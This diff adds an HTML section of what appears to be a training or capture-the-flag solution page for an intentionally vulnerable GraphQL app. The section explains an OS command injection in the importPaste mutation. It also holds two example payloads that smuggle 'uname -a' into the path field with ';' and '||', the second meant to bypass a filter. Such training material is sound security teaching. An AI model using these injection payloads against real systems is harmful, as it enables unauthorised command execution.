@@ -1,0 +1,39 @@
+<!-- Start -->
+<h3 style="color:purple" id="exec-os-1"><b>Code Execution :: OS Command Injection #1</b></h3>
+<hr />
+<h5>Problem Statement</h5>
+<p>
+  The mutation <code>importPaste</code> allows escaping from the parameters and introduce a UNIX command by chaining
+  commands. The GraphQL resolver does not sufficiently validate the input, and passes it directly
+  into <code>cURL</code>.</p>
+<h5>Resources</h5>
+<ul>
+  <li>
+    <a href="https://owasp.org/www-community/attacks/Command_Injection" target="_blank">
+      <i class="fa fa-newspaper"></i> OWASP - Command Injection
+    </a>
+  </li>
+</ul>
+<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-exec-os-1')">Show</button></h5>
+<div id="sol-exec-os-1" style="display:none">
+  <pre class="bash">
+    # Beginner mode
+
+    # Import Paste allows specifying UNIX characters to break out of the URL provided to importPaste, using characters such as ";" "&&", "||", and more.
+    mutation  {
+      importPaste(host:'localhost', port:80, path:"/ ; uname -a", scheme:"http"){
+        result
+      }
+    }
+
+    # Expert mode
+
+    # Import Paste filters characters such as ";" and "&" but not "|", if you manage to cause the import to fail, you can double pipe it to a command that will execute in the context of the operating system.
+    mutation {
+      importPaste(host:"hostthatdoesnotexist.com", port:80, path:"/ || uname -a", scheme:"http") {
+        result
+      }
+    }
+  </pre>
+</div>
+<!-- End -->
